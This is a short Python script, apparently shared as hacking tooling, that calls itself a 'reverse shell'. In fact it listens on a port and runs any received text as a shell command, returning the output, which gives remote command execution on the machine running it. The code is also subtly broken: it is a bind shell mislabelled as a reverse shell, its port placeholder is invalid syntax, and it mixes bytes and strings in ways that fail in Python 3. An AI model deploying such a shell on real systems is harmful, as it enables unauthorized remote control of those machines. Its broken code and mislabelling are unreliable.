# Creator: Paul Olushile(nix)
# Little Robust Reverse Shell script

# Import necessary modules
import socket
import subprocess
import threading
import os

# Define the target host and port
HOST = '<TARGET_IP_ADDRESS>'
PORT = <TARGET_PORT>

# Define the shell and script to use
SHELL = '<SHELL_TO_USE>'
SCRIPT = '<SCRIPT_TO_EXECUTE>'

# Define a function to handle incoming connections
def handle_client(client):
    # Continuously receive commands from the client and execute them
    while True:
        # Receive a command from the client
        command = client.recv(1024)

        # Check if the command is to exit the shell
        if command.strip() == 'exit':
            break

        # Execute the command using the specified shell and script
        output = subprocess.check_output(SHELL + ' -c "' + SCRIPT + ' ' + command + '"', shell=True)

        # Send the output back to the client
        client.send(output)

    # Close the client connection
    client.close()

# Create a new socket
s = socket.socket()

# Bind the socket to the target host and port
s.bind((HOST, PORT))

# Listen for incoming connections
s.listen(5)

# Continuously accept incoming connections
while True:
    # Accept a new incoming connection
    client, addr = s.accept()

    # Print a message indicating the connection was accepted
    print('[+] Connection accepted from %s:%d' % (addr[0], addr[1]))

    # Create a new thread to handle the incoming connection
    client_thread = threading.Thread(target=handle_client, args=(client,))

    # Start the thread
    client_thread.start()
